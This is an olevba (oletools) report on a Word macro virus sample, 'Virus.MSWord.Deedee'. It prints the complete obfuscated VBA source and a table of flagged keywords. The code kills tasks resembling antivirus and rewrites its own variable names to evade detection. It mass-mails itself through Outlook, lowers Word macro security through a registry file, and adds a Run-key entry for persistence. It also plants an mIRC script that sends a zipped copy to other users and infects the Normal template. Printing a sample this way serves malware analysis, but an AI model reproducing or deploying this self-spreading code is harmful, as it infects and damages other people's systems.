olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Deedee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Deedee - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Sub Document_Open() 'f�„
On Error Resume Next ')<+
IUJMp = Day(Date) 'r†5
If IUJMp = 23 Then 'p"Ś
MsgBox Chr(34) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + Chr(100) + Chr(105) + Chr(101) + Chr(32) + _
Chr(100) + Chr(105) + Chr(101) + Chr(34) + Chr(32) + Chr(45) + Chr(91) + Chr(100) + Chr(105) + Chr(101) + _
Chr(51) + Chr(93) + Chr(45) + Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(77) + Chr(73) + Chr(95) + Chr(112) + _
Chr(105) + Chr(114) + Chr(97) + Chr(116), vbInformation, Chr(100) + Chr(105) + Chr(101) + Chr(51) + Chr(32) + _
Chr(86) + Chr(105) + Chr(114) + Chr(117) + Chr(115) '3h|
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Desktop", "Wallpaper") = "C:\Windows\setup.bmp"
ShowCursor 0 ';su
End If 'c~Y
For RMNMp = 1 To Tasks.Count '9|=
If InStr(1, Tasks(RMNMp).Name, "av", vbTextCompare) Or InStr(1, Tasks(RMNMp).Name, "AV", vbTextCompare) Then
Tasks(RMNMp).Close '+m‰
End If '” ”
Next RMNMp '&Ds
If ThisDocument.FullName <> Templates(1).FullName Then '–Ź-
IUJMp = 16 '7•z
ReDim WFAMp(1 To IUJMp) As String '\vf
WFAMp(1) = "IUJMp": WFAMp(2) = "YCQMp": WFAMp(3) = "WFAMp": WFAMp(4) = "SWXMp" 'n�n
WFAMp(5) = "TVTMp": WFAMp(6) = "RMNMp": WFAMp(7) = "KUOMp": WFAMp(8) = "PJVMp" '’@0
WFAMp(9) = "UIHMp": WFAMp(10) = "PUDMp": WFAMp(11) = "DIVMp" '{._
WFAMp(12) = "RRXMp": WFAMp(13) = "IBEMp": WFAMp(14) = "YKBMp": WFAMp(15) = "DXRMp": WFAMp(16) = "FKXMp"
Set KUOMp = ActiveDocument.VBProject.VBComponents(1).CodeModule 'Ejo
For RMNMp = 1 To IUJMp '|8H
Randomize 'g%Y
TVTMp = Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + Chr(Int((25 * Rnd) + 65)) + "Mp" 'ZXs
For YCQMp = 2 To KUOMp.CountOfLines 'ŚF„
PJVMp = KUOMp.Lines(YCQMp, 1) '7�>
If InStr(1, PJVMp, WFAMp(RMNMp), vbTextCompare) Then '�;2
PJVMp = Replace(PJVMp, WFAMp(RMNMp), TVTMp, 1, -1, vbTextCompare) '\!
KUOMp.ReplaceLine YCQMp, PJVMp 'Ź,r
End If '…&&
Next YCQMp ', c
Next RMNMp '�7|
For RMNMp = 2 To KUOMp.CountOfLines 'S#T
PJVMp = KUOMp.Lines(RMNMp, 1) 'yhL
If Len(PJVMp) <= 100 Then ' [A
PJVMp = PJVMp + "'" + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32)) + Chr(Int((120 * Rnd) + 32))
KUOMp.ReplaceLine RMNMp, PJVMp '‰2C
End If 'MF‡
Next RMNMp 'AH‘
End If 'ww/
Dim UIHMp, PUDMp, DIVMp 'P+o
Set UIHMp = CreateObject("Outlook.Application") '^”V
Set PUDMp = UIHMp.GetNameSpace("MAPI") 'md–
If UIHMp = "Outlook" Then '+ŤU
PUDMp.Logon "profile", "password" 'd”n
Set RRXMp = PUDMp.AddressLists 'Md†
For RMNMp = 1 To RRXMp.Count 'i“{
Set ABook = PUDMp.AddressLists(RMNMp) 'wŠo
IBEMp = 1 'DS'
Set YKBMp = ABook.AddressEntries 'eU^
Set DIVMp = UIHMp.CreateItem(0) 'ZZY
For FKXMp = 1 To YKBMp.Count 'V‡%
DXRMp = YKBMp(IBEMp) 'Ž’,
DIVMp.Recipients.Add DXRMp 'N!m
IBEMp = IBEMp + 1 'L€M
If IBEMp > 20 Then IUJMp = YKBMp.Count '”R�
Next FKXMp '–C7
DIVMp.Subject = "hello!!!" 'YNH
DIVMp.Body = "Cool jokes (more in the doc.) " 'kz,
DIVMp.Attachments.Add ActiveDocument.FullName '}wR
DIVMp.Send 'Q3Ž
DXRMp = "" '$:%
Next RMNMp 'j6F
PUDMp.Logoff 'L$"
End If '‚.B
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") <> "inXP" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "XP") = "inXP" '!†9
Options.SaveNormalPrompt = 5 Xor 5 't–`
CommandBars(Chr(84) + Chr(111) + Chr(111) + Chr(108) + Chr(115)).Controls(Chr(77) + Chr(97) + Chr(99) + Chr(114) + Chr(111)).Enabled = (1 Xor 1)
Open "C:\a.reg" For Output As #1 'iQK
Print #1, "REGEDIT4" '2{4
Print #1, "" 'rl8
Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security]" 'TN=
Print #1, """Level"" = dword:00000001" 'Ut�
Print #1, """AccessVBOM"" = dword:00000001" 'a2)
Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run]" 'Vc[
Print #1, """doc"" = " + """" + ActiveDocument.FullName + """" ',]D
Close #1 '€‚j
Shell "C:\Windows\regedit /s C:\a.reg" 'PY1
Kill "C:\a.reg" 'Š-)
Randomize 'P1X
TVTMp = ActiveDocument.FullName '~4Z
PJVMp = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".zip" '”H
scr = "C:\" + Chr(Int((25 * Rnd) + 65)) + ".doc" '!K1
ActiveDocument.SaveAs scr 'Z„I
ActiveDocument.SaveAs TVTMp '&PN
TVTMp = Application.System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
"\CurrentVersion\App Paths\winzip32.exe", "") '',’
Shell TVTMp & " -a -r " & PJVMp & Chr(32) & scr, vbHide 'ŠL–
TVTMp = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\mIRC\", "UninstallString")
TVTMp = Mid(TVTMp, 2, Len(TVTMp) - 23) '01S
Open TVTMp + "script.ini" For Output As #1 'bRb
Print #1, "[Script]" 'j–I
Print #1, "n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }" 'Ky6
Print #1, "n1=/dcc send $nick " & Chr(34) & PJVMp & Chr(34) 'B8\
Print #1, "n2=}" 'Mg�
Close #1 '3%Ž
IUJMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines '2a$
Set KUOMp = Templates(1) 'y^9
KUOMp.VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, myTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
KUOMp.VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, "Sub Document_Close" '–=6
For RMNMp = 2 To IUJMp 'Ź�M
PJVMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1) '/I:
KUOMp.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, PJVMp '5"•
Next RMNMp 'iL`
KUOMp.Save 'Ny4
End If '…ms
IUJMp = ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines 'LK%
If Not ((IUJMp < 130) And (IUJMp > 127)) Then 'Žo~
Set KUOMp = Templates(1) '$M>
ActiveDocument.VBProject.VBComponents(1).CodeModule.DeleteLines 1, IUJMp 'MTŽ
PJVMp = KUOMp.VBProject.VBComponents(1).CodeModule.Lines(1, 1) 'lT‹
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines 1, PJVMp '�u+
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines 2, "Sub Document_Open" 'c>)
IUJMp = KUOMp.VBProject.VBComponents(1).CodeModule.CountOfLines 'G*<
For i = 3 To IUJMp 'o9
PJVMp = KUOMp.VBProject.VBComponents(1).CodeModule.Lines(i, 1) '=ZV
ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i, PJVMp '18€
Next i '1Tc
ActiveDocument.Save 'M|x
End If 'J,[
End Sub '0r~
'o2A
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |a.reg               |Executable file name                         |
|IOC       |winzip32.exe        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

